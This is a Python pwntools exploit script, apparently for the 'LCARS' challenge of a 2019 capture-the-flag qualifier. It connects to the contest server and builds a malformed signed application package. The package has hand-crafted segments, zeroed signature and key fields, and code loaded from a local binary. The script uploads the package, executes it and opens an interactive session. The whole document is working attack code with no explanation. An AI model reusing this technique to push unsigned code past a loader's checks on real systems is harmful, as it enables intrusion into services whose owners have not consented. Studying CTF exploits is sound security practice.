#!/usr/bin/env python
# coding: utf-8

from pwn import *
import IPython

context.arch = 'amd64'

p = remote('lcars022.quals2019.oooverflow.io', 5000)

def pack_papp_sig(code, app_name):
	header = p32(0x4C494645) + p32(4) + app_name.ljust(0x20, '\0')
	crypar0 = 0
	crypar1 = 0
	sigpar = 0
	assert len(code) <= 0x600
	code = code.ljust(0x600, '\0')
	sh_payload = '\0' * 0xdf0 + p32(0x2) + p32(0) + p32(0) + p32(len(code))

	sh_seg = p32(0x30000000) + p32(len(sh_payload)) + p8(0x3) + p8(0) + p8(0) + p8(0)
	rpc_seg = p32(0x42000000) + p32(len(code)) + p8(0x3) + p8(0) + p8(0) + p8(0)
	code_seg = p32(0x70000000) + p32(len(code)) + p8(0x5 | 0x10 | 0x8) + p8(crypar0) + p8(crypar1) + p8(sigpar)
	recover_seg = p32(0x20000000) + p32(8) + p8(0x3) + p8(0) + p8(0) + p8(0)

	siginfo = '\0' * 0x100
	keyiv = '\0' * 0x30

	return header + sh_seg + sh_payload + rpc_seg + code + code_seg + siginfo + keyiv + code + recover_seg + p32(0) + p32(0x1000)

data = pack_papp_sig(open('test.bin','rb').read(), 'aaa1a')

context.log_level = 'debug'

p.sendline('download test.papp {}'.format(len(data)))
p.send(data)
p.sendline('run test.papp')
p.interactive()
